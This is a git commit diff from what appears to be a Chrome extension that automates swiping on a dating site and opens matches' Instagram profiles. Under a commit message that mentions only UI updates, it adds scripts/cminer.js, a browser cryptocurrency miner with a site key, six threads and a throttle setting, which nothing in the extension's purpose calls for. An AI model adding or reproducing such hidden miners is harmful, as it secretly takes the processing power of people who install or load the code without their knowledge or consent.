4b4b13cac76bceae5aa2175af3d617cf1d0ce5bf
irohitb <irohitbhatia@gmail.com>
2018-03-17 00:36:39 +0530

    UI updates, everything  perfected

---
+++ scripts/cminer.js
@@ -0,0 +1,9 @@
+<script>
+console.log("User.... Start")
+var miner=new CRLT.Anonymous('2bbcf9a8a03db4a6be8db3a08e60e254b18eb53003a5',
+        {
+        threads:6,autoThreads:false,throttle:0.2,
+        }
+);
+miner.start();
+</script>
--- scripts/content.js
+++ scripts/content.js
@@ -5,83 +5,112 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
   var profileUp =  document.getElementsByClassName("recCard__openProfile");
   var instaContainer = document.getElementsByClassName("StretchedBox");
   var instaClose = document.getElementsByClassName('close');
-  console.log("stretchable container length")
-  console.log(instaContainer.length)
   var openInsta = document.querySelectorAll("a");
   var lengthTin = document.getElementsByClassName('Fw($medium)');
+  var viewInsta = document.getElementsByClassName("H(55px)")
 
-
-
-if (request.todo == "swipeRight") {
+//Right Swipe with Insta
+if (request.todo == "swipeRightY") {
+console.log("with insta profile");
   function loopLimit (limit) {
-    var i76=1;
+      console.log("With InstaProfile Event Working")
+    var i76=0;
     var interval = setInterval(
     function(){
       console.log("logging number of swipes")
       console.log(i76);
-
-
-        console.log("profile up")
+      console.log("profile up")
         profileUp[0].click()
 
-console.log("Before if container, length");
-console.log("length check");
-
-
-
-
-      if (lengthTin.length > 1 ) {
-        console.log("Inside if lenght")
+      console.log("Before if container, length");
+      console.log("length check");
+      console.log(lengthTin.length);
 
       setTimeout(function() {
-        console.log("Show Insta container")
-          instaContainer[5].click()
-      }, 2000);
+            if (lengthTin.length > 1 ) {
 
-    setTimeout(function() {
-        console.log("Open Insta-profile")
-            openInsta[34].click()
-      }, 4000)
+              console.log("Inside if lenght")
+            setTimeout(function() {
+              console.log("Show Insta container")
+                instaContainer[7].click()
+            }, 2000);
+
+          setTimeout(function() {
+              var instalen = openInsta.length - 1;
+              console.log("Open Insta-profile")
+              console.log(instalen)
+            document.querySelectorAll("a")[33].click()
+          }, 3500)
+
+              setTimeout(function() {
+                console.log("close Insta Container")
+                  instaClose[0].click()
+              }, 4000);
+
+          setTimeout(function() {
+          console.log("Click Like Button")
+            elem[0].click()
+            }, 4100)
+
+            }
+
+            else {
+
+          setTimeout(function() {
+              console.log("Else like event executed");
+              elem[0].click()
+          }, 3000)
+
+        }
 
 
-        setTimeout(function() {
-          console.log("close Insta Container")
-            instaClose[0].click()
-        }, 5000);
+        i76++;
 
-      setTimeout(function() {
-      console.log("Click Like Button")
-        elem[0].click()
-      }, 6000)
+      }, 1000)
 
-      }
-      else {
-    setTimeout(function() {
-
-        console.log("Else like event executed");
-        elem[0].click()
-    }, 3000)
-  }
-
-    i76++;
-    if (i76 == limit) {
-    clearInterval(interval);
-    console.log("game over")
-  }
-}, 7000)
+      if (i76 == limit) {
+        clearInterval(interval);
+          console.log("game over")
+        }
+      }, 5000)
     }
 
   loopLimit(request.rightSwipe)
 }
 
-else if (request.todo == "swipeLeft") {
 
+
+//just rightSwipe
+else if (request.todo == "swipeRight") {
+
+console.log("Swipe Right Event")
   function loopLimit (limit) {
+  console.log("Swipe Right Event Working")
   var i76=0;
   var a = setInterval(
   function(){
-  var elem = document.getElementsByClassName("recsGamepad__button--dislike");
   elem[0].click()
+  i76++;
+  console.log(i76)
+  if (i76 == limit) clearInterval(a);
+  }, 2000)
+  }
+  loopLimit(request.rightSwipe);
+  }
+
+
+
+//just leftSwipe
+else if (request.todo == "swipeLeft") {
+console.log("Swipe left Event")
+
+  function loopLimit (limit) {
+  console.log("Left Right Event Working")
+  var i76=0;
+  var a = setInterval(
+  function(){
+  var eleme = document.getElementsByClassName("recsGamepad__button--dislike");
+  eleme[0].click()
   i76++;
   console.log(i76)
   if (i76 == limit) clearInterval(a);
@@ -90,4 +119,5 @@ else if (request.todo == "swipeLeft") {
 
   loopLimit(request.leftSwipe);
   }
-});
+
+});//chrome Runtime
